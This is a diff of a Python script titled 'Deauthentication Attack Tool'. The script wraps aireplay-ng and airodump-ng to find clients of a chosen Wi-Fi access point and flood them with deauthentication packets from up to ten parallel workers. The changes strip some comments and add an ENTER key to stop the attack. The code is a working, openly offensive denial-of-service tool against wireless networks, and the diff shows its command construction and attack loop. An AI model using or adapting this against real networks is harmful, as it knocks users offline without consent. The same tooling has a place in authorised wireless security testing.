@@ -1,5 +1,4 @@
 #!/usr/bin/env python3
-
 import csv
 import os
 import sys
@@ -173,7 +172,6 @@ def _try_int(s):
 
 
 def choose_ap_by_name(aps: List[Dict], essid: str) -> Optional[Dict]:
-    """Alege un AP după ESSID (nume de rețea)."""
     for ap in aps:
         if ap.get("essid") and essid.lower() in ap.get("essid").lower():
             return ap
@@ -183,7 +181,6 @@ def choose_ap_by_name(aps: List[Dict], essid: str) -> Optional[Dict]:
 # ----------------- DEAUTH FUNCTIONS -----------------
 
 def deauthenticate(bssid_ap: str, bssid_client: Optional[str], iface: str, count: int = 5) -> Tuple[int, str, str]:
-
     cmd_deauth = ["aireplay-ng", "--deauth", str(count), "-a", bssid_ap]
     if bssid_client:
         cmd_deauth += ["-c", bssid_client]
@@ -227,8 +224,6 @@ def deauth_worker(client_mac: str, bssid_ap: str, iface: str, count: int, stop_e
 # ----------------- AIRODUMP MONITORING -----------------
 
 def start_client_monitor(iface: str, channel: int, bssid_ap: str, out_prefix: str, duration: int = 30) -> Optional[Path]:
-  
-   
     out_prefix_path = Path(out_prefix).with_suffix('')
     csv_path = out_prefix_path.parent / f"{out_prefix_path.name}-01.csv"
     
@@ -286,7 +281,6 @@ def start_client_monitor(iface: str, channel: int, bssid_ap: str, out_prefix: st
 
 
 def get_connected_clients(csv_path: Path, bssid_ap: str) -> List[str]:
- 
     try:
         parsed = parse_scan(csv_path)
         stations = parsed.get('stations', [])
@@ -305,8 +299,6 @@ def get_connected_clients(csv_path: Path, bssid_ap: str) -> List[str]:
 # ----------------- MAIN RUN FUNCTION -----------------
 
 def run(iface: str, duration: int = 10, deauth_count: int = 5, attack_duration: int = 60):
-
-
     print(f"\n{'='*50}")
     print("       DEAUTHENTICATION ATTACK TOOL")
     print(f"{'='*50}\n")
@@ -430,10 +422,20 @@ def run(iface: str, duration: int = 10, deauth_count: int = 5, attack_duration: 
     print(f"    Clients: {len(clients)}")
     print(f"    Deauth packets per burst: {deauth_count}")
     print(f"    Attack duration: {attack_duration}s")
-    print(f"\n[!] Press Ctrl+C to stop the attack\n")
+    print(f"\n[!] Press ENTER or Ctrl+C to stop the attack\n")
     
     stop_event = threading.Event()
     results = []
+    
+    def wait_for_enter():
+        try:
+            input()
+            stop_event.set()
+        except EOFError:
+            pass
+    
+    enter_thread = threading.Thread(target=wait_for_enter, daemon=True)
+    enter_thread.start()
     
     try:
         max_workers = min(len(clients), 10)  
@@ -458,13 +460,16 @@ def run(iface: str, duration: int = 10, deauth_count: int = 5, attack_duration: 
             print(f"\n[*] {len(futures)} worker(s) running. Attack in progress...")
             
             start_time = time.time()
-            while time.time() - start_time < attack_duration:
+            while time.time() - start_time < attack_duration and not stop_event.is_set():
                 elapsed = int(time.time() - start_time)
                 remaining = attack_duration - elapsed
                 print(f"\r[*] Attack running... {elapsed}s elapsed, {remaining}s remaining    ", end='', flush=True)
                 time.sleep(1)
             
-            print(f"\n\n[*] Attack duration completed. Stopping workers...")
+            if stop_event.is_set():
+                print(f"\n\n[*] Attack stopped by user (ENTER pressed). Stopping workers...")
+            else:
+                print(f"\n\n[*] Attack duration completed. Stopping workers...")
             stop_event.set()
             
             for client_label, future in futures:
@@ -538,7 +543,6 @@ Examples:
     
     args = parser.parse_args()
     
-    # Check if running as root
     if os.geteuid() != 0:
         print("[!] This script requires root privileges. Run with sudo.")
         sys.exit(1)
